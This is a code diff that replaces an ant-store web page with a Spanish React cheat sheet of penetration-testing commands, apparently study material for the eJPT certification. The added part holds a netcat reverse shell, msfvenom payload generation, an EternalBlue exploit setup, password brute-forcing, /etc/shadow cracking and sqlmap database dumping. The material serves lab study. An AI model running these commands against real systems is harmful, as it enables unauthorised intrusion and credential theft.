@@ -1,600 +1,529 @@
-<!DOCTYPE html>
-<html lang="es">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>AntStore - Tu tienda online de hormigas y hormigueros</title>
-    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
-    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;700&display=swap" rel="stylesheet">
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/4.1.1/animate.min.css">
-    <style>
-        :root {
-            --primary-color: #8b4513;
-            --secondary-color: #f0e6d2;
-            --accent-color: #ffa500;
-            --text-color: #3c2f2f;
-        }
-        body {
-            background-color: var(--secondary-color);
-            color: var(--text-color);
-            font-family: 'Roboto', sans-serif;
-        }
-        .navbar {
-            background-color: var(--primary-color);
-            box-shadow: 0 2px 4px rgba(0,0,0,.1);
-            transition: all 0.3s ease;
-        }
-        .navbar-scrolled {
-            background-color: rgba(139, 69, 19, 0.9);
-        }
-        .jumbotron {
-            background-image: url('https://images.unsplash.com/photo-1611167399364-2d4d96b9d920?ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D&auto=format&fit=crop&w=1470&q=80');
-            background-size: cover;
-            background-position: center;
-            color: white;
-            text-shadow: 2px 2px 4px #000000;
-            padding: 150px 0;
-            position: relative;
-        }
-        .jumbotron::before {
-            content: '';
-            position: absolute;
-            top: 0;
-            right: 0;
-            bottom: 0;
-            left: 0;
-            background: rgba(0,0,0,0.5);
-        }
-        .jumbotron .container {
-            position: relative;
-            z-index: 2;
-        }
-        .card {
-            border: none;
-            transition: transform 0.3s, box-shadow 0.3s;
-            border-radius: 15px;
-            overflow: hidden;
-            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
-        }
-        .card:hover {
-            transform: translateY(-10px);
-            box-shadow: 0 12px 24px rgba(0,0,0,0.2);
-        }
-        #carousel {
-            margin-bottom: 2rem;
-            box-shadow: 0 4px 8px rgba(0,0,0,0.1);
-            border-radius: 15px;
-            overflow: hidden;
-        }
-        .carousel-item img {
-            height: 500px;
-            object-fit: cover;
-        }
-        .btn-primary {
-            background-color: var(--primary-color);
-            border-color: var(--primary-color);
-            transition: all 0.3s ease;
-        }
-        .btn-primary:hover {
-            background-color: #6b3609;
-            border-color: #6b3609;
-            transform: translateY(-2px);
-            box-shadow: 0 4px 8px rgba(0,0,0,0.2);
-        }
-        .section-title {
-            position: relative;
-            display: inline-block;
-            padding-bottom: 10px;
-            margin-bottom: 30px;
-        }
-        .section-title::after {
-            content: '';
-            position: absolute;
-            left: 0;
-            bottom: 0;
-            width: 100%;
-            height: 2px;
-            background-color: var(--primary-color);
-        }
-        footer {
-            background-color: var(--text-color);
-            padding: 40px 0;
-        }
-        .filter-btn {
-            margin-right: 10px;
-            margin-bottom: 20px;
-            transition: all 0.3s ease;
-        }
-        .filter-btn:hover {
-            transform: translateY(-2px);
-        }
-        .product-badge {
-            position: absolute;
-            top: 10px;
-            right: 10px;
-            background-color: var(--accent-color);
-            color: white;
-            padding: 5px 10px;
-            border-radius: 20px;
-            font-weight: bold;
-            z-index: 10;
-        }
-        .cart-icon {
-            font-size: 1.5rem;
-            color: white;
-            transition: all 0.3s ease;
-        }
-        .cart-icon:hover {
-            transform: scale(1.1);
-        }
-        .cart-count {
-            position: absolute;
-            top: -8px;
-            right: -12px;
-            background-color: var(--accent-color);
-            color: white;
-            border-radius: 50%;
-            padding: 4px 8px;
-            font-size: 0.9rem;
-            font-weight: bold;
-            box-shadow: 0 2px 4px rgba(0,0,0,0.2);
-        }
-        .social-icon {
-            transition: all 0.3s ease;
-        }
-        .social-icon:hover {
-            transform: translateY(-5px);
-        }
-        #back-to-top {
-            position: fixed;
-            bottom: 20px;
-            right: 20px;
-            display: none;
-            z-index: 1000;
-        }
-        .parallax-section {
-            background-attachment: fixed;
-            background-position: center;
-            background-repeat: no-repeat;
-            background-size: cover;
-            height: 300px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            color: white;
-            text-shadow: 2px 2px 4px #000000;
-        }
-        .testimonial {
-            background-color: white;
-            border-radius: 15px;
-            padding: 20px;
-            margin-bottom: 20px;
-            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
-        }
-        .testimonial img {
-            width: 60px;
-            height: 60px;
-            border-radius: 50%;
-            margin-right: 15px;
-        }
-        .faq-item {
-            margin-bottom: 20px;
-        }
-        .faq-question {
-            cursor: pointer;
-            font-weight: bold;
-        }
-        .faq-answer {
-            display: none;
-            margin-top: 10px;
-        }
-    </style>
-</head>
-<body>
-    <nav class="navbar navbar-expand-lg navbar-dark fixed-top">
-        <div class="container">
-            <a class="navbar-brand" href="#"><i class="fas fa-ant"></i> AntStore</a>
-            <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav">
-                <span class="navbar-toggler-icon"></span>
-            </button>
-            <div class="collapse navbar-collapse" id="navbarNav">
-                <ul class="navbar-nav ms-auto">
-                    <li class="nav-item"><a class="nav-link" href="#hormigas">Hormigas</a></li>
-                    <li class="nav-item"><a class="nav-link" href="#hormigueros">Hormigueros</a></li>
-                    <li class="nav-item"><a class="nav-link" href="#accesorios">Accesorios</a></li>
-                    <li class="nav-item"><a class="nav-link" href="#testimonios">Testimonios</a></li>
-                    <li class="nav-item"><a class="nav-link" href="#faq">FAQ</a></li>
-                    <li class="nav-item"><a class="nav-link" href="#contacto">Contacto</a></li>
-                    <li class="nav-item">
-                        <a class="nav-link position-relative" href="#carrito">
-                            <i class="fas fa-shopping-cart cart-icon"></i>
-                            <span class="cart-count">0</span>
-                        </a>
-                    </li>
-                </ul>
-            </div>
-        </div>
-    </nav>
+import React, { useState } from 'react';
+import { ChevronRight, Search, Globe, Server, Database, Terminal, Lock, Shield, Code } from 'lucide-react';
 
-    <div class="jumbotron jumbotron-fluid animate__animated animate__fadeIn">
-        <div class="container text-center">
-            <h1 class="display-4">Bienvenido a AntStore</h1>
-            <p class="lead">Tu tienda online especializada en hormigas y hormigueros</p>
-            <a href="#productos" class="btn btn-warning btn-lg animate__animated animate__bounceIn">Ver Productos</a>
-        </div>
-    </div>
+const EjptToolExamples = () => {
+  const [selectedTool, setSelectedTool] = useState(null);
 
-    <div class="container my-5">
-        <div id="carousel" class="carousel slide" data-bs-ride="carousel">
-            <div class="carousel-inner">
-                <div class="carousel-item active">
-                    <img src="https://images.unsplash.com/photo-1611167399364-2d4d96b9d920?ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D&auto=format&fit=crop&w=1470&q=80" class="d-block w-100" alt="Hormigas en acción">
-                    <div class="carousel-caption d-none d-md-block">
-                        <h5>Descubre el fascinante mundo de las hormigas</h5>
-                        <p>Explora nuestra selección de especies únicas</p>
-                    </div>
-                </div>
-                <div class="carousel-item">
-                    <img src="https://images.unsplash.com/photo-1611167399364-2d4d96b9d920?ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D&auto=format&fit=crop&w=1470&q=80" class="d-block w-100" alt="Hormiguero moderno">
-                    <div class="carousel-caption d-none d-md-block">
-                        <h5>Hormigueros de última generación</h5>
-                        <p>Crea el hogar perfecto para tu colonia</p>
-                    </div>
-                </div>
-                <div class="carousel-item">
-                    <img src="https://images.unsplash.com/photo-1611167399364-2d4d96b9d920?ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D&auto=format&fit=crop&w=1470&q=80" class="d-block w-100" alt="Accesorios para hormigas">
-                    <div class="carousel-caption d-none d-md-block">
-                        <h5>Accesorios especializados</h5>
-                        <p>Todo lo que necesitas para el cuidado de tus hormigas</p>
-                    </div>
-                </div>
-            </div>
-            <button class="carousel-control-prev" type="button" data-bs-target="#carousel" data-bs-slide="prev">
-                <span class="carousel-control-prev-icon" aria-hidden="true"></span>
-                <span class="visually-hidden">Anterior</span>
-            </button>
-            <button class="carousel-control-next" type="button" data-bs-target="#carousel" data-bs-slide="next">
-                <span class="carousel-control-next-icon" aria-hidden="true"></span>
-                <span class="visually-hidden">Siguiente</span>
-            </button>
-        </div>
-    </div>
+  const tools = {
+    nmap: {
+      title: "Nmap - Escaneo de Red",
+      icon: Search,
+      color: "bg-blue-600",
+      category: "Reconocimiento",
+      examples: [
+        {
+          scenario: "Descubrir hosts activos",
+          command: "nmap -sn 192.168.1.0/24",
+          explanation: "Hace ping sweep sin escaneo de puertos"
+        },
+        {
+          scenario: "Escaneo básico de puertos",
+          command: "nmap -sV -sC -p- 192.168.1.100",
+          explanation: "-sV: versiones | -sC: scripts default | -p-: todos los puertos"
+        },
+        {
+          scenario: "Escaneo rápido top 1000",
+          command: "nmap -T4 -F 192.168.1.100",
+          explanation: "-T4: velocidad agresiva | -F: fast scan"
+        },
+        {
+          scenario: "Escaneo UDP común",
+          command: "nmap -sU --top-ports 100 192.168.1.100",
+          explanation: "Escanea los 100 puertos UDP más comunes"
+        },
+        {
+          scenario: "Detectar SO y traceroute",
+          command: "nmap -A 192.168.1.100",
+          explanation: "Detección agresiva: SO, versión, scripts, traceroute"
+        },
+        {
+          scenario: "Buscar vulnerabilidades",
+          command: "nmap --script vuln 192.168.1.100",
+          explanation: "Ejecuta scripts de detección de vulnerabilidades"
+        }
+      ]
+    },
+    gobuster: {
+      title: "Gobuster - Directory Bruteforce",
+      icon: Globe,
+      color: "bg-green-600",
+      category: "Web",
+      examples: [
+        {
+          scenario: "Buscar directorios comunes",
+          command: "gobuster dir -u http://10.10.10.100 -w /usr/share/wordlists/dirb/common.txt",
+          explanation: "Busca directorios con wordlist común"
+        },
+        {
+          scenario: "Buscar archivos específicos",
+          command: "gobuster dir -u http://10.10.10.100 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt",
+          explanation: "-x: extensiones a buscar"
+        },
+        {
+          scenario: "Con autenticación básica",
+          command: "gobuster dir -u http://10.10.10.100 -w wordlist.txt -U admin -P password123",
+          explanation: "-U: usuario | -P: password"
+        },
+        {
+          scenario: "Buscar subdominios",
+          command: "gobuster dns -d example.com -w /usr/share/wordlists/subdomains.txt",
+          explanation: "Modo DNS para encontrar subdominios"
+        },
+        {
+          scenario: "Ignorar certificados SSL",
+          command: "gobuster dir -u https://10.10.10.100 -w wordlist.txt -k",
+          explanation: "-k: ignora errores de certificado SSL"
+        }
+      ]
+    },
+    hydra: {
+      title: "Hydra - Brute Force",
+      icon: Lock,
+      color: "bg-red-600",
+      category: "Password Attack",
+      examples: [
+        {
+          scenario: "Ataque SSH",
+          command: "hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.100",
+          explanation: "-l: usuario fijo | -P: wordlist de passwords"
+        },
+        {
+          scenario: "FTP con lista de usuarios",
+          command: "hydra -L users.txt -P passwords.txt ftp://192.168.1.100",
+          explanation: "-L: lista de usuarios | -P: lista de passwords"
+        },
+        {
+          scenario: "HTTP POST form",
+          command: "hydra -l admin -P rockyou.txt 192.168.1.100 http-post-form '/login.php:username=^USER^&password=^PASS^:F=incorrect'",
+          explanation: "F=incorrect: mensaje de error cuando falla"
+        },
+        {
+          scenario: "HTTP GET form",
+          command: "hydra -L users.txt -P pass.txt 192.168.1.100 http-get-form '/login:user=^USER^&pass=^PASS^:S=Welcome'",
+          explanation: "S=Welcome: mensaje de éxito"
+        },
+        {
+          scenario: "MySQL database",
+          command: "hydra -l root -P passwords.txt mysql://192.168.1.100",
+          explanation: "Ataque a base de datos MySQL"
+        },
+        {
+          scenario: "SMB/Windows shares",
+          command: "hydra -l administrator -P rockyou.txt smb://192.168.1.100",
+          explanation: "Fuerza bruta contra shares SMB"
+        }
+      ]
+    },
+    sqlmap: {
+      title: "SQLMap - SQL Injection",
+      icon: Database,
+      color: "bg-purple-600",
+      category: "Web",
+      examples: [
+        {
+          scenario: "Detectar SQL injection",
+          command: "sqlmap -u 'http://10.10.10.100/page.php?id=1' --batch",
+          explanation: "--batch: modo automático sin preguntas"
+        },
+        {
+          scenario: "Listar bases de datos",
+          command: "sqlmap -u 'http://10.10.10.100/page.php?id=1' --dbs",
+          explanation: "--dbs: enumera todas las bases de datos"
+        },
+        {
+          scenario: "Listar tablas de una BD",
+          command: "sqlmap -u 'http://10.10.10.100/page.php?id=1' -D database_name --tables",
+          explanation: "-D: selecciona BD | --tables: lista tablas"
+        },
+        {
+          scenario: "Dumpear tabla específica",
+          command: "sqlmap -u 'http://10.10.10.100/page.php?id=1' -D database -T users --dump",
+          explanation: "-T: tabla | --dump: extrae datos"
+        },
+        {
+          scenario: "Con método POST",
+          command: "sqlmap -u 'http://10.10.10.100/login.php' --data='username=admin&password=test' -p username",
+          explanation: "--data: datos POST | -p: parámetro vulnerable"
+        },
+        {
+          scenario: "Obtener shell del servidor",
+          command: "sqlmap -u 'http://10.10.10.100/page.php?id=1' --os-shell",
+          explanation: "Intenta obtener una shell interactiva"
+        }
+      ]
+    },
+    metasploit: {
+      title: "Metasploit - Exploitation Framework",
+      icon: Shield,
+      color: "bg-orange-600",
+      category: "Explotación",
+      examples: [
+        {
+          scenario: "Iniciar Metasploit",
+          command: "msfconsole\nsearch eternalblue\nuse exploit/windows/smb/ms17_010_eternalblue",
+          explanation: "Buscar y seleccionar exploit"
+        },
+        {
+          scenario: "Configurar exploit",
+          command: "set RHOSTS 192.168.1.100\nset LHOST 192.168.1.50\nset payload windows/x64/meterpreter/reverse_tcp\nexploit",
+          explanation: "RHOSTS: target | LHOST: tu IP"
+        },
+        {
+          scenario: "Escanear con módulo auxiliar",
+          command: "use auxiliary/scanner/smb/smb_version\nset RHOSTS 192.168.1.0/24\nrun",
+          explanation: "Identifica versión de SMB en la red"
+        },
+        {
+          scenario: "FTP anonymous login",
+          command: "use auxiliary/scanner/ftp/anonymous\nset RHOSTS 192.168.1.100\nrun",
+          explanation: "Verifica acceso anónimo FTP"
+        },
+        {
+          scenario: "Generar payload",
+          command: "msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f exe > shell.exe",
+          explanation: "Crea ejecutable malicioso Windows"
+        },
+        {
+          scenario: "Handler para reverse shell",
+          command: "use exploit/multi/handler\nset payload windows/meterpreter/reverse_tcp\nset LHOST 192.168.1.50\nexploit",
+          explanation: "Listener para recibir conexiones inversas"
+        }
+      ]
+    },
+    smbclient: {
+      title: "SMBClient / Enum4linux",
+      icon: Server,
+      color: "bg-indigo-600",
+      category: "SMB",
+      examples: [
+        {
+          scenario: "Listar shares disponibles",
+          command: "smbclient -L //192.168.1.100 -N",
+          explanation: "-L: listar | -N: sin password (null session)"
+        },
+        {
+          scenario: "Conectar a share específico",
+          command: "smbclient //192.168.1.100/share_name -U username",
+          explanation: "Conecta con usuario específico"
+        },
+        {
+          scenario: "Conectar como anonymous",
+          command: "smbclient //192.168.1.100/share -U '' -N",
+          explanation: "Usuario vacío y sin password"
+        },
+        {
+          scenario: "Enum4linux completo",
+          command: "enum4linux -a 192.168.1.100",
+          explanation: "-a: todo (users, shares, groups, policies)"
+        },
+        {
+          scenario: "Enum4linux solo usuarios",
+          command: "enum4linux -U 192.168.1.100",
+          explanation: "-U: enumera solo usuarios"
+        },
+        {
+          scenario: "SMBMap para permisos",
+          command: "smbmap -H 192.168.1.100 -u guest",
+          explanation: "Muestra shares y permisos de acceso"
+        },
+        {
+          scenario: "Descargar recursivamente",
+          command: "smbget -R smb://192.168.1.100/share -U username",
+          explanation: "-R: recursivo, descarga todo"
+        }
+      ]
+    },
+    nikto: {
+      title: "Nikto - Web Scanner",
+      icon: Globe,
+      color: "bg-yellow-600",
+      category: "Web",
+      examples: [
+        {
+          scenario: "Escaneo básico",
+          command: "nikto -h http://192.168.1.100",
+          explanation: "-h: host/URL a escanear"
+        },
+        {
+          scenario: "Escaneo en puerto específico",
+          command: "nikto -h 192.168.1.100 -p 8080",
+          explanation: "-p: puerto personalizado"
+        },
+        {
+          scenario: "Con SSL/HTTPS",
+          command: "nikto -h https://192.168.1.100 -ssl",
+          explanation: "-ssl: fuerza conexión SSL"
+        },
+        {
+          scenario: "Guardar resultados",
+          command: "nikto -h http://192.168.1.100 -o results.html -Format html",
+          explanation: "-o: output | -Format: formato de salida"
+        },
+        {
+          scenario: "Con autenticación",
+          command: "nikto -h http://192.168.1.100 -id admin:password",
+          explanation: "-id: credenciales HTTP Basic Auth"
+        }
+      ]
+    },
+    netcat: {
+      title: "Netcat (nc) - Swiss Army Knife",
+      icon: Terminal,
+      color: "bg-gray-600",
+      category: "Networking",
+      examples: [
+        {
+          scenario: "Banner grabbing",
+          command: "nc 192.168.1.100 80",
+          explanation: "Conecta al puerto y muestra banner"
+        },
+        {
+          scenario: "Listener para reverse shell",
+          command: "nc -lvnp 4444",
+          explanation: "-l: listen | -v: verbose | -n: no DNS | -p: puerto"
+        },
+        {
+          scenario: "Transferir archivo",
+          command: "# Receptor:\nnc -lvnp 4444 > file.txt\n# Emisor:\nnc 192.168.1.100 4444 < file.txt",
+          explanation: "Envía archivos entre máquinas"
+        },
+        {
+          scenario: "Reverse shell (víctima)",
+          command: "nc 192.168.1.50 4444 -e /bin/bash",
+          explanation: "-e: ejecuta comando (bash shell)"
+        },
+        {
+          scenario: "Bind shell (atacante)",
+          command: "nc 192.168.1.100 4444",
+          explanation: "Conecta a bind shell en víctima"
+        },
+        {
+          scenario: "Escaneo de puertos simple",
+          command: "nc -zv 192.168.1.100 1-1000",
+          explanation: "-z: zero I/O mode | escanea puertos 1-1000"
+        }
+      ]
+    },
+    johntheripper: {
+      title: "John the Ripper - Password Cracking",
+      icon: Lock,
+      color: "bg-red-700",
+      category: "Password Attack",
+      examples: [
+        {
+          scenario: "Crackear hash básico",
+          command: "john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt",
+          explanation: "Usa wordlist para crackear hashes"
+        },
+        {
+          scenario: "Ver passwords crackeadas",
+          command: "john --show hash.txt",
+          explanation: "Muestra passwords ya descubiertas"
+        },
+        {
+          scenario: "Hash de /etc/shadow",
+          command: "unshadow /etc/passwd /etc/shadow > unshadowed.txt\njohn unshadowed.txt",
+          explanation: "Combina passwd y shadow para crackear"
+        },
+        {
+          scenario: "SSH private key",
+          command: "ssh2john id_rsa > ssh_hash.txt\njohn --wordlist=rockyou.txt ssh_hash.txt",
+          explanation: "Convierte llave SSH y crackea passphrase"
+        },
+        {
+          scenario: "ZIP protegido",
+          command: "zip2john file.zip > zip_hash.txt\njohn zip_hash.txt",
+          explanation: "Extrae hash de ZIP y lo crackea"
+        },
+        {
+          scenario: "Formato específico",
+          command: "john --format=NT hash.txt",
+          explanation: "Especifica formato de hash (NT, MD5, SHA, etc)"
+        }
+      ]
+    },
+    searchsploit: {
+      title: "Searchsploit - Exploit Database",
+      icon: Code,
+      color: "bg-pink-600",
+      category: "Explotación",
+      examples: [
+        {
+          scenario: "Buscar exploits por software",
+          command: "searchsploit apache 2.4.49",
+          explanation: "Busca exploits para Apache versión 2.4.49"
+        },
+        {
+          scenario: "Búsqueda exacta",
+          command: "searchsploit -t vsftpd 2.3.4",
+          explanation: "-t: búsqueda por título exacto"
+        },
+        {
+          scenario: "Ver código del exploit",
+          command: "searchsploit -x 49584",
+          explanation: "-x: examina/muestra el código del exploit"
+        },
+        {
+          scenario: "Copiar exploit al directorio",
+          command: "searchsploit -m 49584",
+          explanation: "-m: mirror/copia exploit al directorio actual"
+        },
+        {
+          scenario: "Buscar por plataforma",
+          command: "searchsploit --platform windows kernel",
+          explanation: "Filtra por sistema operativo"
+        },
+        {
+          scenario: "Actualizar base de datos",
+          command: "searchsploit -u",
+          explanation: "Actualiza la base de datos local de exploits"
+        }
+      ]
+    }
+  };
 
-    <div class="container my-5" id="hormigas">
-        <h2 class="text-center mb-4 section-title animate__animated animate__fadeInUp">Nuestras Hormigas</h2>
-        <div class="row">
-            <div class="col-md-4 mb-4">
-                <div class="card h-100 animate__animated animate__fadeInLeft">
-                    <span class="product-badge">Bestseller</span>
-                    <img src="https://images.unsplash.com/photo-1611167399364-2d4d96b9d920?ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D&auto=format&fit=crop&w=1470&q=80" class="card-img-top" alt="Hormiga Reina">
-                    <div class="card-body d-flex flex-column">
-                        <h5 class="card-title">Hormiga Reina Lasius Niger</h5>
-                        <p class="card-text flex-grow-1">Comienza tu propia colonia con nuestra hormiga reina Lasius Niger. Ideal para principiantes.</p>
-                        <div class="d-flex justify-content-between align-items-center mt-auto">
-                            <span class="h5 mb-0">29.99€</span>
-                            <a href="#" class="btn btn-primary add-to-cart">Añadir al carrito</a>
-                        </div>
-                    </div>
-                </div>
-            </div>
-            <div class="col-md-4 mb-4">
-                <div class="card h-100 animate__animated animate__fadeInUp">
-                    <img src="https://images.unsplash.com/photo-1611167399364-2d4d96b9d920?ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D&auto=format&fit=crop&w=1470&q=80" class="card-img-top" alt="Hormigas Obreras">
-                    <div class="card-body d-flex flex-column">
-                        <h5 class="card-title">Pack de Hormigas Obreras Messor Barbarus</h5>
-                        <p class="card-text flex-grow-1">Amplía tu colonia con nuestro pack de 20 hormigas obreras Messor Barbarus.</p>
-                        <div class="d-flex justify-content-between align-items-center mt-auto">
-                            <span class="h5 mb-0">19.99€</span>
-                            <a href="#" class="btn btn-primary add-to-cart">Añadir al carrito</a>
-                        </div>
-                    </div>
-                </div>
-            </div>
-            <div class="col-md-4 mb-4">
-                <div class="card h-100 animate__animated animate__fadeInRight">
-                    <span class="product-badge">Oferta</span>
-                    <img src="https://images.unsplash.com/photo-1611167399364-2d4d96b9d920?ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D&auto=format&fit=crop&w=1470&q=80" class="card-img-top" alt="Kit de Inicio">
-                    <div class="card-body d-flex flex-column">
-                        <h5 class="card-title">Kit de Inicio Completo</h5>
-                        <p class="card-text flex-grow-1">Todo lo que necesitas para comenzar tu aventura en la cría de hormigas.</p>
-                        <div class="d-flex justify-content-between align-items-center mt-auto">
-                            <span class="h5 mb-0"><del>79.99€</del> 59.99€</span>
-                            <a href="#" class="btn btn-primary add-to-cart">Añadir al carrito</a>
-                        </div>
-                    </div>
-                </div>
-            </div>
-        </div>
-    </div>
+  const categories = [...new Set(Object.values(tools).map(t => t.category))];
 
-    <div class="parallax-section" style="background-image: url('https://images.unsplash.com/photo-1611167399364-2d4d96b9d920?ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D&auto=format&fit=crop&w=1470&q=80');">
-        <div class="container text-center">
-            <h2 class="display-4">Descubre el fascinante mundo de las hormigas</h2>
-        </div>
-    </div>
-
-    <div class="container my-5" id="hormigueros">
-        <h2 class="text-center mb-4 section-title animate__animated animate__fadeInUp">Nuestros Hormigueros</h2>
-        <div class="text-center mb-4">
-            <button class="btn btn-outline-primary filter-btn active" data-filter="all">Todos</button>
-            <button class="btn btn-outline-primary filter-btn" data-filter="pequeño">Pequeños</button>
-            <button class="btn btn-outline-primary filter-btn" data-filter="mediano">Medianos</button>
-            <button class="btn btn-outline-primary filter-btn" data-filter="grande">Grandes</button>
-        </div>
-        <div class="row">
-            <div class="col-md-4 mb-4 hormiguero-item" data-category="pequeño">
-                <div class="card h-100 animate__animated animate__fadeInLeft">
-                    <img src="https://images.unsplash.com/photo-1611167399364-2d4d96b9d920?ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D&auto=format&fit=crop&w=1470&q=80" class="card-img-top" alt="Hormiguero Pequeño">
-                    <div class="card-body d-flex flex-column">
-                        <h5 class="card-title">Hormiguero Acrílico Pequeño</h5>
-                        <p class="card-text flex-grow-1">Perfecto para colonias pequeñas o principiantes. Fácil de mantener y observar.</p>
-                        <div class="d-flex justify-content-between align-items-center mt-auto">
-                            <span class="h5 mb-0">39.99€</span>
-                            <a href="#" class="btn btn-primary add-to-cart">Añadir al carrito</a>
-                        </div>
-                    </div>
+  const ToolCard = ({ toolKey, data }) => {
+    const Icon = data.icon;
+    const isSelected = selectedTool === toolKey;
+    
+    return (
+      <div className="mb-4">
+        <button
+          onClick={() => setSelectedTool(isSelected ? null : toolKey)}
+          className={`w-full ${data.color} text-white p-4 rounded-lg shadow-lg hover:opacity-90 transition-all flex items-center justify-between group`}
+        >
+          <div className="flex items-center gap-3">
+            <Icon size={24} />
+            <div className="text-left">
+              <div className="font-bold text-lg">{data.title}</div>
+              <div className="text-xs opacity-80">{data.category}</div>
+            </div>
+          </div>
+          <ChevronRight 
+            size={20} 
+            className={`transform transition-transform ${isSelected ? 'rotate-90' : ''} group-hover:translate-x-1`}
+          />
+        </button>
+        
+        {isSelected && (
+          <div className="mt-3 space-y-3 animate-fadeIn">
+            {data.examples.map((example, idx) => (
+              <div key={idx} className="bg-gray-800 p-4 rounded-lg border-l-4 border-yellow-500 hover:border-yellow-300 transition-colors">
+                <div className="flex items-start gap-2 mb-2">
+                  <div className="bg-yellow-500 text-black text-xs font-bold px-2 py-1 rounded">
+                    {idx + 1}
+                  </div>
+                  <h4 className="font-bold text-yellow-400 flex-1">
+                    {example.scenario}
+                  </h4>
                 </div>
-            </div>
-            <div class="col-md-4 mb-4 hormiguero-item" data-category="mediano">
-                <div class="card h-100 animate__animated animate__fadeInUp">
-                    <span class="product-badge">Nuevo</span>
-                    <img src="https://images.unsplash.com/photo-1611167399364-2d4d96b9d920?ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D&auto=format&fit=crop&w=1470&q=80" class="card-img-top" alt="Hormiguero Mediano">
-                    <div class="card-body d-flex flex-column">
-                        <h5 class="card-title">Hormiguero de Yeso Mediano</h5>
-                        <p class="card-text flex-grow-1">Ideal para colonias en crecimiento. Ofrece más espacio y opciones de expansión.</p>
-                        <div class="d-flex justify-content-between align-items-center mt-auto">
-                            <span class="h5 mb-0">59.99€</span>
-                            <a href="#" class="btn btn-primary add-to-cart">Añadir al carrito</a>
-                        </div>
-                    </div>
-                </div>
-            </div>
-            <div class="col-md-4 mb-4 hormiguero-item" data-category="grande">
-                <div class="card h-100 animate__animated animate__fadeInRight">
-                    <img src="https://images.unsplash.com/photo-1611167399364-2d4d96b9d920?ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D&auto=format&fit=crop&w=1470&q=80" class="card-img-top" alt="Hormiguero Grande">
-                    <div class="card-body d-flex flex-column">
-                        <h5 class="card-title">Hormiguero Modular Grande</h5>
-                        <p class="card-text flex-grow-1">Para colonias maduras o especies más grandes. Múltiples cámaras y túneles expandibles.</p>
-                        <div class="d-flex justify-content-between align-items-center mt-auto">
-                            <span class="h5 mb-0">89.99€</span>
-                            <a href="#" class="btn btn-primary add-to-cart">Añadir al carrito</a>
-                        </div>
-                    </div>
-                </div>
-            </div>
-        </div>
-    </div>
-
-    <div class="container my-5" id="accesorios">
-        <h2 class="text-center mb-4 section-title animate__animated animate__fadeInUp">Accesorios</h2>
-        <div class="row">
-            <div class="col-md-3 mb-4">
-                <div class="card h-100 animate__animated animate__fadeInLeft">
-                    <img src="https://images.unsplash.com/photo-1611167399364-2d4d96b9d920?ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D&auto=format&fit=crop&w=1470&q=80" class="card-img-top" alt="Pinzas de alimentación">
-                    <div class="card-body d-flex flex-column">
-                        <h5 class="card-title">Pinzas de alimentación</h5>
-                        <p class="card-text flex-grow-1">Pinzas de precisión para alimentar a tus hormigas de forma segura.</p>
-                        <div class="d-flex justify-content-between align-items-center mt-auto">
-                            <span class="h5 mb-0">9.99€</span>
-                            <a href="#" class="btn btn-primary add-to-cart">Añadir al carrito</a>
-                        </div>
-                    </div>
-                </div>
-            </div>
-            <div class="col-md-3 mb-4">
-                <div class="card h-100 animate__animated animate__fadeInUp">
-                    <img src="https://images.unsplash.com/photo-1611167399364-2d4d96b9d920?ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D&auto=format&fit=crop&w=1470&q=80" class="card-img-top" alt="Lupa de observación">
-                    <div class="card-body d-flex flex-column">
-                        <h5 class="card-title">Lupa de observación</h5>
-                        <p class="card-text flex-grow-1">Lupa de alta calidad para observar de cerca a tus hormigas.</p>
-                        <div class="d-flex justify-content-between align-items-center mt-auto">
-                            <span class="h5 mb-0">14.99€</span>
-                            <a href="#" class="btn btn-primary add-to-cart">Añadir al carrito</a>
-                        </div>
-                    </div>
-                </div>
-            </div>
-            <div class="col-md-3 mb-4">
-                <div class="card h-100 animate__animated animate__fadeInUp">
-                    <img src="https://images.unsplash.com/photo-1611167399364-2d4d96b9d920?ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D&auto=format&fit=crop&w=1470&q=80" class="card-img-top" alt="Kit de alimentación">
